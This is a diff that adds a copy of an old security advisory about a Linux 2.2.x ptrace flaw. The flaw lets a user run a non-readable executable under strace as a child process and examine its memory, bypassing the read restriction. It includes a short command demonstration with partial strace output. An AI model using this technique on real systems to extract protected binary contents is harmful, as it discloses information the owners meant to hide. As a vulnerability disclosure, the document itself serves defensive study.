@@ -1,0 +1,33 @@
+source: http://www.securityfocus.com/bid/2044/info
+
+Ptrace is a unix system call that is used to analyze running processes, usually for breakpoint debugging. The linux implementation of ptrace in 2.2.x kernels (and possibly earlier versions) contains a vulnerability that may allow an attacker to gain sensitive information in non-readable non-setuid executable files.
+
+For security reasons, regular users are not allowed to ptrace setuid programs (or attach to processes running as another uid) nor are they allowed to trace processes originating from un-readable disk images (binary files). These restrictions are properly enforced in Linux ptrace when using PT_ATTACH to trace aribtrary non-children processes in memory.
+
+When ptrace is called to trace a child process however, it does not properly check to make sure that the disk image is readable to the user. As a result, the process can be traced and its core memory examined. Information compiled into the binary that was meant to be hidden via setting it non-readable may be disclosed to an attacker.
+
+The information obtained could be used to assist in other attacks. 
+
+Trace on non-readable file using PT_ATTACH:
+
+$ ls -l testfile
+-rwx--x--x 1 root root 216916 Dec 4 11:59 testfile
+
+$ ./testfile
+waiting..
+
+From another shell:
+
+$ strace -p 11535 <---process ID of "testfile" process
+attach: ptrace(PTRACE_ATTACH, ...): Operation not permitted <---Because testfile isn't readable. Good, secure behaviour
+
+---------------
+
+Trace on non-readable file as child process:
+
+$ strace testfile
+
+SYS_197(0x3, 0xbffff650, 0x40197d40, 0x80cca38, 0x3) = -1 ENOSYS (Function not implemented)
+fstat(3, {st_mode=S_IFREG|0644, st_size=1744, ...}) = 0
+mmap(0, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x40015000
+.. 
